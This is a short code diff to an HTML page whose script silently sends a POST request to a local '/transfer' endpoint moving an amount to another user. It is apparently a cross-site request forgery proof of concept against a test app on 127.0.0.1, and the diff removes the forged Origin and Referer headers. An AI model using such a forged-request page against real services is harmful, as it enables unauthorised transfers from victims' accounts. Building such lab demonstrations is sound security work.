@@ -6,13 +6,8 @@
 <body>
     <script>
         // Send the POST request with the necessary headers
-        fetch("http://127.0.0.1:8080/transfer", {
+        fetch("https://127.0.0.1:8080/transfer", {
             method: "POST",
-            headers: {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Origin": "http://127.0.0.1:8080",
-                "Referer": "http://127.0.0.1:8080/viewtransfer"
-            },
             body: "user_to=s&amount=1"
         })
         .then(response => response.text())
